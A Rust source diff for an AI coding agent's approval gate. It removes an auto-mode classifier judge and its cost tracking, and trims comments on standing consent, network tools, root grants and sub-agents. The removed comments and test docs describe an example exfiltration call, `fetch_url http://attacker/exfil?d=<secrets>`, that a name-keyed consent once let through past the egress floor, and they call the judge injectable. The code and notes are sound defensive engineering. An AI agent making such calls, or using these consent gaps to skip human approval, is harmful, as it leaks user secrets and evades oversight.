@@ -1,24 +1,20 @@
-//! The approval gate's resolution layer: standing consents (config
-//! `auto_allow` + session "a"), the session permission mode, the auto-mode
-//! Flash judge, and the application of the user's explicit decision. The
-//! batch machinery in `tool_result.rs` consults this before parking a call.
+//! Resolve approval requests through standing consent, the session permission
+//! mode, or an explicit decision. The batch machinery in `tool_result.rs`
+//! consults this module before parking a call.
 
 use tokio::sync::mpsc;
 use tokio_util::sync::CancellationToken;
 
 use crate::execution_policy::{
-    PermissionMode, RiskLevel, accept_edits_approvable, command_shape,
-    dispatch_declares_allow_commands, network_requested, shell_command_of,
+    ApprovalAuthority, PermissionMode, accept_edits_approvable, command_shape, network_requested,
+    shell_command_of,
 };
-use crate::model_registry::DEEPSEEK_FLASH;
 use crate::runtime::AgentRuntime;
 use crate::runtime::event::{RuntimeEvent, ToolCallId, TurnId, emit};
 use crate::runtime::state::PendingToolBatch;
 use crate::runtime::tool_result::BatchOutcome;
 use crate::session_entry::Ask;
-use crate::tool::{
-    ApprovalDecision, ApprovalRequest, RunAuthority, ToolCall, ToolResult, ToolRunOutcome,
-};
+use crate::tool::{ApprovalDecision, RunAuthority, ToolCall, ToolResult, ToolRunOutcome};
 
 /// Whether "approve for the whole session" may be recorded for a tool.
 /// Shell-class tools are excluded: their risk lives in the per-call
@@ -28,26 +24,12 @@ use crate::tool::{
 /// Sub-agent dispatch is excluded on the same grounds: what its prompt
 /// authorizes is in the arguments — a writing role, or `network: true` — and
 /// a consent recorded on one kind of dispatch would silently cover the other.
-/// A networked child is its own approval point (see the `SubAgent` arm of
-/// `ExecPolicy::evaluate_tool`), and the Auto egress floor sits *below*
-/// standing consent, so a remembered `agent` would have skipped it. Root
-/// grants are excluded too: each request is about one specific directory,
-/// and "always widen the boundary without asking" must not be a recordable
-/// consent.
+/// Root grants require explicit approval for the requested directory.
 ///
-/// The network-native tools (`fetch_url`/`web_search`) are excluded by the
-/// sub-agent argument taken literally: their risk is ENTIRELY in the `url` /
-/// `query` argument, and this consent is by name, so one `a` on
-/// `fetch_url https://docs.rs/serde` made every later
-/// `fetch_url http://attacker/exfil?d=<secrets>` run unprompted. The egress
-/// floor that exists for exactly that call (the `is_network_tool` check in
-/// [`AgentRuntime::auto_approval_granted`]) lives in the permission-mode layer,
-/// which standing consent short-circuits *above* — so the floor never saw the
-/// call, in every mode including `Default`. These tools carry no `network: true`
-/// flag to key a consent on the way shell does, and there is no useful identity
-/// below the URL itself, so the option is withdrawn rather than narrowed:
-/// [`session_consent_recordable`] reads this, so the panel stops offering "a"
-/// instead of silently downgrading it to a one-time approve.
+/// Network tools (`fetch_url`/`web_search`) also carry their risk in the URL or
+/// query. Remembering one approval by tool name would authorize every future
+/// request. [`session_consent_recordable`] uses this rule to decide when the
+/// panel should offer "a".
 pub(super) fn session_allowable(tool_name: &str) -> bool {
     !matches!(
         crate::execution_policy::ExecPolicy::classify_tool(tool_name),
@@ -85,9 +67,9 @@ pub(super) fn session_allowable(tool_name: &str) -> bool {
 pub fn session_consent_recordable(
     tool_name: &str,
     arguments: &serde_json::Value,
-    authority: Option<crate::execution_policy::ApprovalAuthority>,
+    authority: Option<ApprovalAuthority>,
 ) -> bool {
-    if authority == Some(crate::execution_policy::ApprovalAuthority::HumanOnly) {
+    if authority == Some(ApprovalAuthority::HumanOnly) {
         return false;
     }
     session_allowable(tool_name) || shell_consent_identity(tool_name, arguments).is_some()
@@ -150,16 +132,9 @@ pub(super) fn is_root_grant(tool_name: &str) -> bool {
         == crate::execution_policy::ToolKind::RootGrant
 }
 
-/// Whether a call is a network-native tool (`fetch_url`/`web_search`). Their
-/// egress is intrinsic, so they carry no `network: true` argument — the
-/// auto-mode egress floor must recognize them by kind, not by that flag, or the
-/// classifier would decide a call whose only purpose is reaching the network.
-///
-/// Exported because the approval panel needs the same answer and had been
-/// asking the wrong question: it chose its default focus from the *declared*
-/// `network` flag, which these tools never carry, so the one prompt class the
-/// panel's own doc says must open on deny opened on approve. Two spellings of
-/// "does this reach the network" cannot be kept in step; one can.
+/// Whether a tool has intrinsic network access (`fetch_url`/`web_search`).
+/// The approval panel uses this alongside the call's declared `network` flag
+/// to focus Deny on egress requests.
 #[must_use]
 pub fn is_network_tool(tool_name: &str) -> bool {
     crate::execution_policy::ExecPolicy::classify_tool(tool_name)
@@ -200,111 +175,29 @@ pub(super) fn session_shell_prefix(call: &ToolCall) -> Option<String> {
 /// the consent, not a detail beside it — a consent recorded on an offline
 /// `npm test` must not wave through `npm test` with egress, for the same reason
 /// a consent on one kind of sub-agent dispatch does not cover the other (see
-/// [`session_allowable`]): the Auto egress floor sits *below* standing consent,
-/// so a key that ignored the flag skipped that floor in every mode.
+/// [`session_allowable`]). Standing consent is checked before the permission mode.
 pub(super) fn shell_consent_key(call: &ToolCall) -> Option<(String, bool)> {
     let identity = session_shell_prefix(call)?;
     Some((identity, network_requested(&call.arguments)))
 }
 
-/// The layer that resolved a gated call without a human (see
-/// [`AgentRuntime::auto_approval_granted`]), kept apart because two of them
-/// *parsed* the command and the rest only recognised a name or a mode: the
-/// executor runs a parsed command as that parse's argv, with no shell in
-/// between, and everything else as the text a human would have read.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub(super) enum AutoApproval {
-    /// Config `auto_allow` names the tool.
-    ConfigAllowList,
-    /// A session "a" on this tool name (never `shell`/`job`, see
-    /// [`session_allowable`]).
-    SessionTool,
-    /// A session "a" remembered this command's identity (`command_shape`).
-    SessionShell,
-    /// The accept-edits allowance read the command as a bounded fs edit.
-    AcceptEdits,
-    /// The Auto-mode Flash judge approved the call.
-    Judge,
-    /// Yolo approves everything that reaches the gate.
-    Yolo,
-}
-
-impl AutoApproval {
-    /// Whether the executor may hand the command to a shell (`Approved`) or
-    /// must run the policy's own argv (`Parse`).
-    pub(super) fn authority(self) -> RunAuthority {
-        match self {
-            Self::SessionShell | Self::AcceptEdits => RunAuthority::Parse,
-            Self::ConfigAllowList | Self::SessionTool | Self::Judge | Self::Yolo => {
-                RunAuthority::Approved
-            }
-        }
-    }
-}
-
 impl AgentRuntime {
-    /// Whether a gated call may run without asking, and on whose authority.
-    /// Two independent layers:
-    /// (1) standing consent — a configured `auto_allow` name or a session
-    /// "a" — is mode-independent; (2) the session [`PermissionMode`] relaxes
-    /// the gate more broadly. Policy hard-denials are unaffected either way:
-    /// they short-circuit in the registry before any decision is consulted.
-    /// (That covers commands the deny parser recognized — it is best-effort,
-    /// so what holds an obfuscation it misses is never this list. What it *is*
-    /// depends on the platform, and on Windows the answer is "nothing": see
-    /// [what is behind a command nobody read](crate::execution_policy#what-is-behind-a-command-nobody-read).)
-    ///
-    /// `None` means ask. `Some` names the layer that resolved it, because the
-    /// executor needs to know whether that layer *parsed* the command (a
-    /// remembered shell identity, the accept-edits allowance) or merely waved
-    /// the text through (a tool name, the judge, Yolo) — see
-    /// [`AutoApproval::authority`].
+    /// Resolve a gated call through standing consent or the session mode.
+    /// `None` leaves the request for an explicit decision. The returned
+    /// authority determines how the executor runs a command.
     pub(super) async fn auto_approval_granted(
         &self,
         call: &ToolCall,
-        request: &ApprovalRequest,
-        cancel: &CancellationToken,
-    ) -> Option<AutoApproval> {
-        // Widening the write boundary is a human decision in EVERY mode and
-        // through EVERY consent channel: above Layer 1 so a config
-        // `auto_allow` entry cannot become a standing root-grant (grants
-        // must stay explicit per-directory actions), and above Layer 2 so
-        // even Yolo prompts — this call widens the write boundary itself,
-        // which is what bounds an auto-approved command wherever anything
-        // bounds it, so no mode and no standing consent may hand it over.
-        if is_root_grant(&call.name) {
+        required_authority: ApprovalAuthority,
+    ) -> Option<RunAuthority> {
+        // Root grants and HumanOnly plans require a decision for this request,
+        // regardless of standing consent or mode. Unattended consumers deny them.
+        if is_root_grant(&call.name) || required_authority == ApprovalAuthority::HumanOnly {
             return None;
         }
-        // A plan marked `HumanOnly` (today: an irreversible-outward command)
-        // joins the root grant at this height — ABOVE config `auto_allow`, above
-        // session memory, above every permission mode and above the judge — for
-        // the same reason: it is a decision only a person makes, and no standing
-        // consent was ever collected for it. It sits above `is_subagent` too, so
-        // the ordering cannot be read as "a child skips this check".
-        //
-        // The two differ in what the human gets, and that difference is the whole
-        // point: a root grant is a boundary widening nobody may pre-approve,
-        // while an irreversible command IS something a person can authorize for
-        // one run. So this one parks a decision instead of being refused, and the
-        // unattended consumers (`subagent_approval_decision`,
-        // `unattended_denial_note`) turn that unanswered park into a denial with
-        // a note naming the floor.
-        //
-        // Yolo included: it auto-approves everything that reaches it, and the
-        // point of this check is that this call does not reach it.
-        if request.authority == crate::execution_policy::ApprovalAuthority::HumanOnly {
-            return None;
-        }
-        // Inside a sub-agent NONE of the channels below apply: a child's gated
-        // calls are decided solely by `subagent_approval_decision` (role-based
-        // writes, the dispatch-time network grant), consulted when the call
-        // parks. Config `auto_allow` and session memory are the human's own
-        // session authority — letting them short-circuit here escalated a child
-        // past its dispatch. Concretely, a parent `auto_allow = ["shell"]` would
-        // hand a child dispatched WITHOUT network full egress (it declares
-        // `network: true` and the config waves it through, below the egress
-        // floor), and let a read-only-role child run arbitrary shell. Force
-        // every gated child call to the sub-agent decider instead.
+        // A child's gated calls use its dispatch grants in
+        // `subagent_approval_decision`. Applying parent consent here would let
+        // the child exceed its granted authority.
         if self.is_subagent {
             return None;
         }
@@ -314,158 +207,34 @@ impl AgentRuntime {
         // added later whose name happens to extend a consented entry would
         // have shipped pre-approved without anyone deciding that.
         if self.config.approval_auto_allow.contains(&call.name) {
-            return Some(AutoApproval::ConfigAllowList);
+            return Some(RunAuthority::Approved);
         }
-        let user_task = {
+        {
             let state = self.state.lock().await;
             if state.session_approved.contains(&call.name) {
-                return Some(AutoApproval::SessionTool);
+                return Some(RunAuthority::Approved);
             }
             // Shell isn't blanket session-approvable by name; trust at command
             // granularity instead ("a" remembered `cargo test`, `git push`, …),
             // and only for the egress the consent was given with. A remembered
-            // command that cannot run as argv on this host (a Windows `.cmd`
-            // shim or cmd builtin) is NOT auto-approved here: `SessionShell`
-            // authority runs it as argv, which fails to spawn. It falls through
-            // to the mode below — Yolo runs it as text via `cmd /C`, every other
-            // mode prompts — so `npm test` keeps working instead of dying.
+            // command must be runnable as argv. Windows shell builtins and
+            // `.cmd` shims fall through to the mode below.
             if let Some(key) = shell_consent_key(call)
                 && state.session_trusted_shell_prefixes.contains(&key)
                 && command_runnable_unattended(call)
             {
-                return Some(AutoApproval::SessionShell);
+                return Some(RunAuthority::Parse);
             }
-            state.current_prompt.clone().unwrap_or_default().text
-        }; // release the state lock before any mode logic (Auto awaits a judge)
+        }
 
         // Layer 2: session permission mode.
         match self.permission_mode() {
             PermissionMode::Default => None,
             PermissionMode::AcceptEdits => (accept_edits_approvable(&call.name, &call.arguments)
                 && command_runnable_unattended(call))
-            .then_some(AutoApproval::AcceptEdits),
-            PermissionMode::Auto => {
-                // Egress sits above the judge: opening the network is the
-                // human's call, never something a classifier waves through.
-                // (`[sandbox] network = "always"` hands sandboxed commands
-                // ambient egress at the plan stage, with no declaration and no
-                // prompt; a call that *declares* the flag still asks here — the
-                // declaration is what puts it in front of a human.)
-                // `request.network` is the
-                // *declared* flag on shell/job/sub-agent calls; the network-
-                // native tools (fetch_url/web_search) carry no such flag, so
-                // they are floored by kind here too — otherwise an
-                // `fetch_url http://attacker/exfil?d=<secrets>` was decided by
-                // the Flash judge, a soft and injectable backstop, in Auto mode.
-                // Short-circuits before the judge spends a request.
-                if request.network || is_network_tool(&call.name) {
-                    return None;
-                }
-                // A dispatch carrying `allow_commands` is its own approval point
-                // for the same reason, and it sits above the judge too: the
-                // judge reads only the dispatch's `task` text, which never
-                // mentions the authorized commands, so a read-only-role dispatch
-                // (not covered by the accept-edits inherit below) would otherwise
-                // have `bash` waved through by the classifier.
-                if dispatch_declares_allow_commands(&call.name, &call.arguments) {
-                    return None;
-                }
-                self.auto_mode_approves(call, request, &user_task, cancel)
-                    .await
-            }
-            PermissionMode::Yolo => Some(AutoApproval::Yolo),
+            .then_some(RunAuthority::Parse),
+            PermissionMode::Yolo => Some(RunAuthority::Approved),
         }
-    }
-
-    /// Auto mode: a Flash classifier judges the call. Three hard floors below
-    /// the judge: the top risk tier never reaches it (a High-tier call asks
-    /// unless the AcceptEdits allowance inherited just below already covers it),
-    /// the offline echo backend can't judge, and a cancel mid-flight aborts into
-    /// "ask". Everything else the classifier decides, failing safe to a prompt.
-    /// The judge's token usage is billed to the session. Returns which
-    /// allowance decided — the inherited accept-edits parse, or the judge.
-    async fn auto_mode_approves(
-        &self,
-        call: &ToolCall,
-        request: &ApprovalRequest,
-        user_task: &str,
-        cancel: &CancellationToken,
-    ) -> Option<AutoApproval> {
-        // Auto is at least as permissive as AcceptEdits (it sits above it in the
-        // mode cycle), so inherit its bounded fs-edit allowances first. Without
-        // this, a "more permissive" mode would ask for a plain `mkdir src/x`
-        // that the stricter AcceptEdits waves through — shell defaults to the
-        // High risk tier, which the judge floor below always prompts on. The
-        // same argv-runnable gate as AcceptEdits above: a Windows `.cmd`/builtin
-        // is not auto-approved as argv (it would fail to spawn); it falls to the
-        // judge/prompt path, which runs it as text.
-        if accept_edits_approvable(&call.name, &call.arguments) && command_runnable_unattended(call)
-        {
-            return Some(AutoApproval::AcceptEdits);
-        }
-        if request.risk_level == RiskLevel::High {
-            return None;
-        }
-        if self.client.provider_name() == crate::echo_client::EchoClient::PROVIDER {
-            return None;
-        }
-        let action = crate::approval_classifier::action_summary(&call.name, &call.arguments);
-        let input = crate::approval_classifier::ClassifierInput {
-            tool_name: &call.name,
-            action: &action,
-            risk_level: request.risk_level,
-            safety_notes: &request.safety_notes,
-            user_task,
-        };
-        let turn_id = self.state.lock().await.current_turn_id.clone();
-        // Race the judge against cancellation so Esc during a slow classifier
-        // reply aborts the call into "ask" instead of blocking the turn.
-        let (approved, usage) = tokio::select! {
-            biased;
-            () = cancel.cancelled() => return None,
-            verdict = crate::approval_classifier::approves(&*self.client, DEEPSEEK_FLASH, &input) => verdict,
-        };
-        if let Some(usage) = usage {
-            self.record_classifier_cost(DEEPSEEK_FLASH, &usage, turn_id.as_ref())
-                .await;
-        }
-        approved.then_some(AutoApproval::Judge)
-    }
-
-    /// Fold a classifier call's token cost into the running turn and session
-    /// totals. The judge runs on a separate (cheap) model from the turn, so its
-    /// usage never flows through the turn telemetry; without this the reported
-    /// cost silently under-counts every auto-mode gated call.
-    async fn record_classifier_cost(
-        &self,
-        model: &str,
-        usage: &crate::model::Usage,
-        turn_id: Option<&TurnId>,
-    ) {
-        let cost = crate::pricing::calculate_turn_cost(model, usage);
-        let cache_hit = usage.prompt_cache_hit_tokens.unwrap_or(0);
-        let cache_miss = usage.prompt_cache_miss_tokens.unwrap_or(0);
-        let savings = crate::pricing::cache_savings(model, cache_hit);
-        let mut state = self.state.lock().await;
-        // Turn totals too: the judge fires during this turn's approval gate, so
-        // the turn `cost` (headless/bot output, `/status`) must include it — not
-        // only the session total.
-        // A completed judge can wait for this lock while begin_turn replaces
-        // the turn. Its spend must not enter the successor's counters.
-        if turn_id.is_some() && state.current_turn_id.as_ref() == turn_id {
-            state.turn_cost.usd += cost.usd;
-            state.turn_cost.cny += cost.cny;
-            state.turn_cache_hit_tokens += u64::from(cache_hit);
-            state.turn_cache_miss_tokens += u64::from(cache_miss);
-        }
-        state.session_cost.usd += cost.usd;
-        state.session_cost.cny += cost.cny;
-        // Fold cache tokens too, so the session cache-hit rate/savings read
-        // consistently with `accumulate_request_usage`.
-        state.session_cache_hit_tokens += u64::from(cache_hit);
-        state.session_cache_miss_tokens += u64::from(cache_miss);
-        state.session_cache_savings.usd += savings.usd;
-        state.session_cache_savings.cny += savings.cny;
     }
 
     /// `denial_note`, when present and the decision denies, replaces the
@@ -1182,17 +951,9 @@ mod tests {
         );
     }
 
-    /// The network-native tools take no standing consent by name.
-    ///
-    /// `fetch_url`'s whole risk is its `url`, and this consent is keyed on the
-    /// tool NAME — so an "a" given on a docs fetch used to wave through
-    /// `fetch_url http://attacker/exfil?d=<secrets>` for the rest of the
-    /// session. The egress floor written for exactly that call sits in the
-    /// permission-mode layer, which Layer 1 short-circuits above, so it never
-    /// ran: asserted here as "no consent is recordable", which is what keeps
-    /// the name out of `session_approved` in the first place.
+    /// A session consent keyed on the tool name would approve all URLs or queries.
     #[test]
-    fn network_native_tools_take_no_standing_consent() {
+    fn network_native_tools_do_not_record_session_consent() {
         for (tool, arguments) in [
             ("fetch_url", json!({ "url": "https://docs.rs/serde" })),
             ("web_search", json!({ "query": "serde derive" })),
@@ -1206,8 +967,6 @@ mod tests {
                 "{tool} must not offer a session consent"
             );
         }
-        // The exclusion is by KIND, so it cannot drift from the classifier the
-        // egress floor reads.
         assert!(is_network_tool("fetch_url"));
         assert!(is_network_tool("web_search"));
         // An ordinary tool still records one, so this did not disable the
@@ -1231,102 +990,5 @@ mod tests {
         );
         assert_eq!(root_grant_requested_path(&call(json!({}))), "");
         assert_eq!(root_grant_requested_path(&call(json!({"path": 7}))), "");
-    }
-
-    /// Classifier spend folds ADDITIVELY into the session totals — the "cost
-    /// honesty" the status line sells. Every `+=` in
-    /// `record_classifier_cost` was mutable to `-=`/`*=` with the suite
-    /// green: nothing anywhere asserted the arithmetic. Integer cache
-    /// counters are pinned exactly; the money totals are pinned as strictly
-    /// increasing across a second fold (kills `-=`, and `*=` on a
-    /// zero-initialised total stays zero). The table rates the judge in BOTH
-    /// currencies, and the asserts pin both on purpose — per currency, never
-    /// summed, so the currencies cannot mask each other; if the table ever
-    /// goes single-currency, this test must change with it, as a red test,
-    /// not by silently covering less.
-    #[tokio::test]
-    async fn classifier_cost_folds_additively_into_the_session() {
-        struct MuteClient;
-        #[async_trait::async_trait]
-        impl crate::client::LlmClient for MuteClient {
-            fn provider_name(&self) -> &'static str {
-                "mute"
-            }
-            fn model(&self) -> &str {
-                "mute"
-            }
-            async fn stream_chat(
-                &self,
-                _request: crate::model::ChatRequest,
-            ) -> crate::error::AgentResult<crate::client::AgentEventStream> {
-                unreachable!("the classifier-cost test never talks to a model")
-            }
-        }
-
-        let runtime =
-            crate::runtime::AgentRuntime::new(MuteClient, crate::tool::ToolRegistry::default());
-        runtime.begin_turn("original").await.unwrap();
-        let turn_id = runtime.state.lock().await.current_turn_id.clone();
-        let usage = crate::model::Usage {
-            prompt_tokens: Some(100),
-            completion_tokens: Some(50),
-            total_tokens: Some(150),
-            reasoning_tokens: None,
-            prompt_cache_hit_tokens: Some(10),
-            prompt_cache_miss_tokens: Some(5),
-        };
-        runtime
-            .record_classifier_cost(DEEPSEEK_FLASH, &usage, turn_id.as_ref())
-            .await;
-        let (cost_1, savings_1) = {
-            let state = runtime.state.lock().await;
-            assert_eq!(state.session_cache_hit_tokens, 10);
-            assert_eq!(state.session_cache_miss_tokens, 5);
-            // Per-currency, not summed: the table prices Flash in BOTH
-            // currencies, and a summed assert lets the currencies mask each
-            // other (`*=` zeroing one while `+=` still moves the other).
-            assert!(state.session_cost.usd > 0.0, "usd rate is in the table");
-            assert!(state.session_cost.cny > 0.0, "cny rate is in the table");
-            assert!(state.session_cache_savings.usd > 0.0);
-            assert!(state.session_cache_savings.cny > 0.0);
-            // The judge fires during a turn, so its spend folds into the TURN
-            // totals too — the number headless/bot report. Under-counting it
-            // there was the bug this half of the fold fixes.
-            assert_eq!(state.turn_cache_hit_tokens, 10);
-            assert_eq!(state.turn_cache_miss_tokens, 5);
-            assert!(state.turn_cost.usd > 0.0, "turn usd must include the judge");
-            assert!(state.turn_cost.cny > 0.0, "turn cny must include the judge");
-            (state.session_cost, state.session_cache_savings)
-        };
-
-        runtime
-            .record_classifier_cost(DEEPSEEK_FLASH, &usage, turn_id.as_ref())
-            .await;
-        let state = runtime.state.lock().await;
-        assert_eq!(state.session_cache_hit_tokens, 20);
-        assert_eq!(state.session_cache_miss_tokens, 10);
-        assert!(
-            state.session_cost.usd > cost_1.usd,
-            "usd must fold additively"
-        );
-        assert!(
-            state.session_cost.cny > cost_1.cny,
-            "cny must fold additively"
-        );
-        assert!(state.session_cache_savings.usd > savings_1.usd);
-        assert!(state.session_cache_savings.cny > savings_1.cny);
-        drop(state);
-
-        runtime.begin_turn("successor").await.unwrap();
-        runtime
-            .record_classifier_cost(DEEPSEEK_FLASH, &usage, turn_id.as_ref())
-            .await;
-        let state = runtime.state.lock().await;
-        assert_eq!(state.session_cache_hit_tokens, 30);
-        assert_eq!(state.session_cache_miss_tokens, 15);
-        assert_eq!(state.turn_cache_hit_tokens, 0);
-        assert_eq!(state.turn_cache_miss_tokens, 0);
-        assert_eq!(state.turn_cost.usd, 0.0);
-        assert_eq!(state.turn_cost.cny, 0.0);
     }
 }
